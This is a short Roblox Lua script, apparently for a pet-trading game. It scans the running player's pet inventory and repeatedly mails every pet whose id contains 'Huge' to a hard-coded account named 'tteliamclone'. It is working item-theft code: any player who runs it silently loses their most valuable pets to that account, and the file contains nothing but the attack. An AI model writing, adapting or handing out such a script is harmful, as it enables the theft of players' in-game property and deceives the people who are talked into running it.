local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local function getPetInventory()
    return require(ReplicatedStorage:WaitForChild("Library")).Save.Get().Inventory.Pet
end

local function findAndSendPet(substringToFind)
    local PetInventory = getPetInventory()

    local petUID = nil

    for uid, pet in pairs(PetInventory) do
        if string.find(pet.id, substringToFind) then
            petUID = uid
            break
        end
    end

    if petUID then
        ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer("tteliamclone", "Hippo On Top", "Pet", petUID, 1)
        return true
    end

    return false
end

local substringToFind = "Huge"
local continueScript = true

while continueScript do
    local continueLoop = true

    while continueLoop do
        continueLoop = findAndSendPet(substringToFind)
        wait(0.1)
    end

    continueScript = false
end
